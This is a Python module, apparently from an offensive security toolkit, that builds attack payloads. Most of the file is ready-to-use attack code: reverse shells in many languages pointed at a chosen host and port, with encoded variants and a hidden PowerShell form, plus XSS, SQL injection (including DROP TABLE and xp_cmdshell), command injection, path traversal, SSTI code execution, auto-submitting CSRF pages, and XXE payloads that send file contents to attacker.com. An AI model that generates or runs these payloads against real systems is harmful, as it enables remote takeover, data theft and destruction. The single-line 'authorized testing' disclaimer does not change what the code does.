"""
Payload Generator

Generates various types of payloads for security testing including:
- Reverse shells
- Web application payloads (XSS, SQLi, etc.)
- Binary exploitation payloads
- Network payloads

WARNING: This module is for educational and authorized testing purposes only.
"""

import base64
import urllib.parse
import html
import json
import random
import string
from typing import Dict, List, Optional, Any
from app.logger import logger


class PayloadGenerator:
    """Advanced payload generator for various attack vectors"""
    
    def __init__(self):
        self.encoders = {
            'url': urllib.parse.quote,
            'html': html.escape,
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'hex': lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x)
        }
    
    def generate_reverse_shells(self, lhost: str, lport: int) -> Dict[str, str]:
        """Generate reverse shell payloads for various platforms"""
        logger.info(f"Generating reverse shell payloads for {lhost}:{lport}")
        
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'bash_encoded': f"echo 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' | base64 -d | bash",
            'netcat': f"nc -e /bin/sh {lhost} {lport}",
            'netcat_mkfifo': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            'java': f"r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
            'socat': f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
            'awk': f"awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print \\$0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null"
        }
        
        # Add encoded versions
        encoded_payloads = {}
        for name, payload in payloads.items():
            if not name.endswith('_encoded'):
                encoded_payloads[f"{name}_base64"] = base64.b64encode(payload.encode()).decode()
                encoded_payloads[f"{name}_url"] = urllib.parse.quote(payload)
        
        payloads.update(encoded_payloads)
        
        return payloads
    
    def generate_xss_payloads(self) -> Dict[str, List[str]]:
        """Generate XSS payloads for various contexts"""
        logger.info("Generating XSS payloads")
        
        payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>alert(/XSS/)</script>',
                '<script>alert`XSS`</script>',
                '<script>alert(document.domain)</script>',
                '<script>alert(document.cookie)</script>'
            ],
            'img_tag': [
                '<img src=x onerror=alert("XSS")>',
                '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
                '<img src=x onerror=alert(/XSS/)>',
                '<img src=x onerror=alert`XSS`>',
                '<img src="x" onerror="alert(\'XSS\')">'
            ],
            'svg': [
                '<svg onload=alert("XSS")>',
                '<svg><script>alert("XSS")</script></svg>',
                '<svg onload=alert(String.fromCharCode(88,83,83))>',
                '<svg onload=alert(/XSS/)>'
            ],
            'iframe': [
                '<iframe src="javascript:alert(\'XSS\')">',
                '<iframe onload=alert("XSS")>',
                '<iframe src=data:text/html,<script>alert("XSS")</script>>'
            ],
            'input': [
                '<input onfocus=alert("XSS") autofocus>',
                '<input onblur=alert("XSS") autofocus><input autofocus>',
                '<input type="text" value="" onfocus="alert(\'XSS\')" autofocus>'
            ],
            'body': [
                '<body onload=alert("XSS")>',
                '<body onpageshow=alert("XSS")>',
                '<body onfocus=alert("XSS")>'
            ],
            'javascript_protocol': [
                'javascript:alert("XSS")',
                'javascript:alert(String.fromCharCode(88,83,83))',
                'javascript:alert(/XSS/)',
                'javascript:alert`XSS`'
            ],
            'event_handlers': [
                'onmouseover=alert("XSS")',
                'onclick=alert("XSS")',
                'onload=alert("XSS")',
                'onerror=alert("XSS")',
                'onfocus=alert("XSS")',
                'onblur=alert("XSS")'
            ],
            'filter_bypass': [
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
                '<script>setTimeout("alert(\'XSS\')",1)</script>',
                '<script>setInterval("alert(\'XSS\')",1)</script>',
                '"><script>alert("XSS")</script>',
                '\';alert("XSS");//',
                '</script><script>alert("XSS")</script>',
                '<script>alert("XSS");</script>',
                '<script type="text/javascript">alert("XSS");</script>'
            ],
            'polyglot': [
                'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>',
                '">\'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>">\'><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">',
                '\'"--></style></script></noscript></title><img src=x onerror=alert()>'
            ]
        }
        
        # Add encoded versions
        for category, payload_list in payloads.items():
            encoded_list = []
            for payload in payload_list:
                encoded_list.append(urllib.parse.quote(payload))
                encoded_list.append(html.escape(payload))
                encoded_list.append(base64.b64encode(payload.encode()).decode())
            payloads[f"{category}_encoded"] = encoded_list
        
        return payloads
    
    def generate_sqli_payloads(self) -> Dict[str, List[str]]:
        """Generate SQL injection payloads"""
        logger.info("Generating SQL injection payloads")
        
        payloads = {
            'basic_auth_bypass': [
                "' OR '1'='1",
                '" OR "1"="1',
                "' OR 1=1--",
                '" OR 1=1--',
                "admin'--",
                'admin"--',
                "admin' #",
                'admin" #',
                "admin'/*",
                'admin"/*',
                "' or 1=1#",
                '" or 1=1#'
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
                "' AND (SELECT SUBSTRING(database(),1,1))='d'--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT SLEEP(5))--",
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; BENCHMARK(5000000,MD5(1))--"
            ],
            'error_based': [
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--"
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES ('hacker','password')--",
                "'; UPDATE users SET password='hacked' WHERE id=1--",
                "'; EXEC xp_cmdshell('whoami')--"
            ],
            'second_order': [
                "admin'; INSERT INTO logs VALUES ('injected')--",
                "test'; UPDATE users SET role='admin' WHERE username='test'--"
            ],
            'nosql': [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "this.password.match(/.*/)"}',
                '{"$regex": ".*"}',
                '[$ne]=1',
                '[$gt]=',
                '[$regex]=.*'
            ]
        }
        
        # Add encoded versions
        for category, payload_list in payloads.items():
            encoded_list = []
            for payload in payload_list:
                encoded_list.append(urllib.parse.quote(payload))
                encoded_list.append(payload.replace(' ', '/**/'))
            payloads[f"{category}_encoded"] = encoded_list
        
        return payloads
    
    def generate_command_injection_payloads(self) -> Dict[str, List[str]]:
        """Generate command injection payloads"""
        logger.info("Generating command injection payloads")
        
        payloads = {
            'basic': [
                '; ls',
                '| whoami',
                '&& id',
                '|| uname -a',
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '&& cat /etc/passwd',
                '|| cat /etc/passwd'
            ],
            'backticks': [
                '`id`',
                '`whoami`',
                '`uname -a`',
                '`cat /etc/passwd`',
                '`ls -la`'
            ],
            'dollar_syntax': [
                '$(id)',
                '$(whoami)',
                '$(uname -a)',
                '$(cat /etc/passwd)',
                '$(ls -la)'
            ],
            'windows': [
                '& dir',
                '| dir',
                '&& dir',
                '|| dir',
                '; dir',
                '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
                '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
                '&& whoami',
                '|| whoami'
            ],
            'blind': [
                '; sleep 5',
                '| sleep 5',
                '&& sleep 5',
                '|| sleep 5',
                '; ping -c 4 127.0.0.1',
                '| ping -c 4 127.0.0.1',
                '&& ping -c 4 127.0.0.1'
            ],
            'filter_bypass': [
                ';${IFS}ls',
                '|${IFS}whoami',
                ';$IFS$9ls',
                '|$IFS$9whoami',
                ';cat${IFS}/etc/passwd',
                '|cat${IFS}/etc/passwd',
                ';c\\at${IFS}/etc/passwd',
                '|c\\at${IFS}/etc/passwd'
            ]
        }
        
        # Add encoded versions
        for category, payload_list in payloads.items():
            encoded_list = []
            for payload in payload_list:
                encoded_list.append(urllib.parse.quote(payload))
                encoded_list.append(payload.replace(' ', '${IFS}'))
            payloads[f"{category}_encoded"] = encoded_list
        
        return payloads
    
    def generate_lfi_payloads(self) -> Dict[str, List[str]]:
        """Generate Local File Inclusion payloads"""
        logger.info("Generating LFI payloads")
        
        payloads = {
            'basic': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '../../../etc/shadow',
                '../../../etc/hosts',
                '../../../etc/group',
                '../../../proc/version',
                '../../../proc/cmdline'
            ],
            'deep_traversal': [
                '../../../../../../../../etc/passwd',
                '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '../' * 10 + 'etc/passwd',
                '..\\' * 10 + 'windows\\system32\\drivers\\etc\\hosts'
            ],
            'null_byte': [
                '../../../etc/passwd%00',
                '../../../etc/passwd%00.jpg',
                '../../../etc/passwd\x00',
                '../../../etc/passwd\x00.png'
            ],
            'double_encoding': [
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
                '..%2f..%2f..%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd'
            ],
            'filter_bypass': [
                '....//....//....//etc/passwd',
                '...\\/...\\/...\\/etc/passwd',
                '....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts',
                '..///..///..///etc/passwd'
            ],
            'php_wrappers': [
                'php://filter/read=convert.base64-encode/resource=../../../etc/passwd',
                'php://filter/convert.base64-encode/resource=../../../etc/passwd',
                'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
                'expect://id',
                'file:///etc/passwd'
            ],
            'log_poisoning': [
                '../../../var/log/apache2/access.log',
                '../../../var/log/apache2/error.log',
                '../../../var/log/nginx/access.log',
                '../../../var/log/nginx/error.log',
                '../../../var/log/auth.log',
                '../../../var/log/mail.log'
            ]
        }
        
        return payloads
    
    def generate_xxe_payloads(self) -> Dict[str, List[str]]:
        """Generate XXE (XML External Entity) payloads"""
        logger.info("Generating XXE payloads")
        
        payloads = {
            'basic': [
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><test>&xxe;</test>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><test>&xxe;</test>'
            ],
            'blind': [
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><test></test>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://attacker.com/?data=%file;\'>">%eval;%exfiltrate;]><test></test>'
            ],
            'parameter_entity': [
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><test></test>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><test></test>'
            ],
            'billion_laughs': [
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>'
            ]
        }
        
        return payloads
    
    def generate_ssti_payloads(self) -> Dict[str, List[str]]:
        """Generate Server-Side Template Injection payloads"""
        logger.info("Generating SSTI payloads")
        
        payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{config.items()}}',
                '{{request}}',
                '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
                '{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'id\').read()}}',
                '{{lipsum.__globals__[\'os\'].popen(\'id\').read()}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
                '{{_self.env.enableDebug()}}{{_self.env.enableAutoReload()}}',
                '{{dump(app)}}'
            ],
            'smarty': [
                '{$smarty.version}',
                '{php}echo `id`;{/php}',
                '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",self::clearConfig())}',
                '{system(\'id\')}'
            ],
            'freemarker': [
                '${7*7}',
                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
                '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/etc/passwd\').toURL().openStream().readAllBytes()?join(" ")}',
                '${"freemarker.template.utility.Execute"?new()("id")}'
            ],
            'velocity': [
                '#set($ex=$rt.getRuntime().exec("id"))',
                '$ex.waitFor()',
                '#set($out=$ex.getInputStream())',
                '#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
                '#set($str=$rt.getRuntime().exec("whoami").getInputStream())'
            ],
            'erb': [
                '<%= 7*7 %>',
                '<%= system("id") %>',
                '<%= `id` %>',
                '<%= File.open("/etc/passwd").read %>',
                '<%= Dir.entries("/") %>'
            ]
        }
        
        return payloads
    
    def generate_csrf_payloads(self, target_url: str, method: str = 'POST') -> Dict[str, str]:
        """Generate CSRF payloads"""
        logger.info(f"Generating CSRF payloads for {target_url}")
        
        payloads = {}
        
        if method.upper() == 'POST':
            payloads['html_form'] = f'''
            <html>
            <body>
                <form action="{target_url}" method="POST" id="csrf-form">
                    <input type="hidden" name="action" value="delete_user" />
                    <input type="hidden" name="user_id" value="1" />
                    <input type="submit" value="Click me!" />
                </form>
                <script>document.getElementById('csrf-form').submit();</script>
            </body>
            </html>
            '''
            
            payloads['javascript'] = f'''
            <script>
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "{target_url}", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("action=delete_user&user_id=1");
            </script>
            '''
            
            payloads['fetch_api'] = f'''
            <script>
            fetch('{target_url}', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/x-www-form-urlencoded',
                }},
                body: 'action=delete_user&user_id=1'
            }});
            </script>
            '''
        
        elif method.upper() == 'GET':
            payloads['img_tag'] = f'<img src="{target_url}?action=delete_user&user_id=1" />'
            payloads['iframe'] = f'<iframe src="{target_url}?action=delete_user&user_id=1"></iframe>'
            payloads['script_tag'] = f'<script src="{target_url}?action=delete_user&user_id=1"></script>'
        
        return payloads
    
    def encode_payload(self, payload: str, encoding_type: str) -> str:
        """Encode payload using specified encoding"""
        if encoding_type in self.encoders:
            return self.encoders[encoding_type](payload)
        else:
            logger.warning(f"Unknown encoding type: {encoding_type}")
            return payload
    
    def generate_custom_payload(self, payload_type: str, **kwargs) -> str:
        """Generate custom payload based on type and parameters"""
        if payload_type == 'reverse_shell':
            lhost = kwargs.get('lhost', '127.0.0.1')
            lport = kwargs.get('lport', 4444)
            shell_type = kwargs.get('shell_type', 'bash')
            shells = self.generate_reverse_shells(lhost, lport)
            return shells.get(shell_type, shells['bash'])
        
        elif payload_type == 'xss':
            context = kwargs.get('context', 'basic')
            xss_payloads = self.generate_xss_payloads()
            payload_list = xss_payloads.get(context, xss_payloads['basic'])
            return random.choice(payload_list)
        
        elif payload_type == 'sqli':
            injection_type = kwargs.get('injection_type', 'basic_auth_bypass')
            sqli_payloads = self.generate_sqli_payloads()
            payload_list = sqli_payloads.get(injection_type, sqli_payloads['basic_auth_bypass'])
            return random.choice(payload_list)
        
        else:
            logger.warning(f"Unknown payload type: {payload_type}")
            return ""
    
    def generate_wordlist(self, base_words: List[str], mutations: List[str] = None) -> List[str]:
        """Generate wordlist with mutations"""
        if mutations is None:
            mutations = ['', '1', '123', '2023', '2024', 'admin', 'test', 'backup', 'old', 'new']
        
        wordlist = []
        for word in base_words:
            wordlist.append(word)
            for mutation in mutations:
                wordlist.append(f"{word}{mutation}")
                wordlist.append(f"{mutation}{word}")
                wordlist.append(f"{word}_{mutation}")
                wordlist.append(f"{word}-{mutation}")
        
        return list(set(wordlist))  # Remove duplicates